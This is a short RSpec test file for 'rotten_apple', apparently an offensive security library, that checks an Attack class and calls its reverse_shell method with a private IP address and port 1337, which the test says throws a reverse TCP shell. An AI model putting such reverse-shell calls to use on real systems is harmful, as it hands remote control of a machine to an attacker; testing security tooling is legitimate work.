require 'rotten_apple'

describe RottenApple::Attack do

  before(:each) do
    @attack = RottenApple::Attack.new()
  end

  context "when trying to throw a reverse shell" do 
    subject{@attack}
    its(:class) {should == RottenApple::Attack}
    
    it "should throw a reverse tcp shell" do
      subject.reverse_shell('192.168.1.66', 1337)
    end
  end

end
